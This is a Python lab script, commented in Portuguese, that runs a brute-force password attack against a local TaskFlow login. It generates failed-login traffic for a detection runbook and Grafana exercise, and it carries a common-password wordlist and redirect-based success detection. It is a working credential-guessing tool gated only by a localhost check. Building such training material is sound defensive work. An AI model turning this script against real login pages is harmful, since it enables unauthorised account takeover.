"""
Simulacao de forca bruta contra o login da TaskFlow (Modulo 6).

Uso exclusivo em laboratorio: o script se recusa a atacar qualquer host que nao
seja local. Serve para gerar, de verdade, o padrao de falhas de login que o
runbook (docs/runbook-login-bruteforce.md) ensina a detectar no Grafana.

Exemplo:
    python scripts/bruteforce.py
    python scripts/bruteforce.py --username admin --delay 0.1

Usa apenas a biblioteca padrao do Python.
"""

import argparse
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

LOCAL_HOSTS = {"localhost", "127.0.0.1", "::1"}

# Lista curta de senhas comuns. A senha de laboratorio do usuario "admin" esta
# propositalmente perto do fim, para que o ataque produza varias falhas
# seguidas de um sucesso, o cenario mais grave que o runbook precisa cobrir.
PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "abc123", "111111",
    "letmein", "welcome", "monkey", "dragon", "master", "login",
    "princesa", "football", "iloveyou", "sunshine", "trustno1", "passw0rd",
    "senha", "senha1", "admin", "admin1", "administrator", "root",
    "toor", "changeme", "admin123",
]


class SemRedirecionamento(urllib.request.HTTPRedirectHandler):
    """Nao segue o 302: o redirecionamento para /tasks e o sinal de sucesso."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def tentar_login(opener, url, username, password):
    """Devolve True se o login funcionou (302), False se falhou (200)."""
    corpo = urllib.parse.urlencode(
        {"username": username, "password": password}
    ).encode()
    try:
        with opener.open(urllib.request.Request(url, data=corpo), timeout=10):
            return False
    except urllib.error.HTTPError as exc:
        return exc.code in (301, 302, 303)


def main():
    parser = argparse.ArgumentParser(description=__doc__.split("\n")[1])
    parser.add_argument("--url", default="http://localhost:5000/login")
    parser.add_argument("--username", default="admin")
    parser.add_argument(
        "--delay", type=float, default=0.2, help="segundos entre tentativas"
    )
    parser.add_argument(
        "--no-stop", action="store_true", help="continua apos achar a senha"
    )
    args = parser.parse_args()

    host = urllib.parse.urlparse(args.url).hostname
    if host not in LOCAL_HOSTS:
        sys.exit(f"Recusado: {host!r} nao e um host local. Uso so em laboratorio.")

    opener = urllib.request.build_opener(SemRedirecionamento)
    total = len(PASSWORDS)
    falhas = 0
    inicio = time.time()
    print(f"Atacando {args.url} como {args.username!r} ({total} senhas)")

    for numero, senha in enumerate(PASSWORDS, start=1):
        if tentar_login(opener, args.url, args.username, senha):
            print(f"[{numero:02d}/{total}] SUCESSO apos {falhas} falhas")
            if not args.no_stop:
                break
        else:
            falhas += 1
            print(f"[{numero:02d}/{total}] falha")
        time.sleep(args.delay)

    duracao = time.time() - inicio
    print(f"Fim: {falhas} falhas em {duracao:.1f}s")


if __name__ == "__main__":
    main()
